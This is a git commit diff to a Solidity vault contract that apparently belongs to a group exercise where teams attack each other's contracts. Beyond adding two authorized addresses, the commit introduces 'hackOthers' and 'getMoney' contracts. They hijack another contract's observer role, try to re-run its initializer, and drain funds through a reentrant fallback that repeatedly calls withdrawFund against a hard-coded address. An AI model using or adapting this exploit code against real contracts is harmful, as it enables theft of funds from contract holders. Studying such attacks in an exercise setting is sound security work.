672b3caa9cddd5179d03e6ec53d90341e992adc4
old2 <achenge07@163.com>
2018-02-01 15:58:21 +0800

    Update TimeDelayedVault.sol

--- TimeDelayedVault.sol
+++ TimeDelayedVault.sol
@@ -119,7 +119,9 @@ contract TimeDelayedVault is BasicMultiOwnerVault {
         this.call(bytes4(sha3("initializeVault()")));
        
         // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
-        authorizedUsers.push(xxxx);
+        authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c); //second
+        authorizedUsers.push(0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db);//third
+
 
         for(uint i=0; i<authorizedUsers.length; i++) {
             votes.push(false);
@@ -134,3 +136,36 @@ contract TimeDelayedVault is BasicMultiOwnerVault {
         return res;
     }
 }
+
+contract hackOthers {
+    address otherAddress = 0x0; //change to othergroup contract address
+    function addObserver() {
+        otherAddress.call(bytes4(sha3("setObserver()")),this);
+    }
+    function setOwner(){ //100% fail
+        otherAddress.call(bytes4(sha3("initilizeVault()")));
+    }
+}
+
+contract getMoney{
+    address ct_addr = 0xAEc6E567C38746cAeDCB55a5A007704E69e00c70;
+    uint count = 0;
+    TimeDelayedVault ct = TimeDelayedVault(ct_addr);
+    function addObserver(){
+       ct.setObserver(this);    
+    }
+    function checkObserver() returns (bool){
+        return ct_addr == ct.withdrawObserver();
+    }
+    function hack(){ // need checkObserver first
+         ct.withdrawFund(this);
+    }
+    function () payable {
+        if(count<=1000){
+            ct.withdrawFund(this);
+        }else{
+            count = 0;
+        }
+    }
+}
+
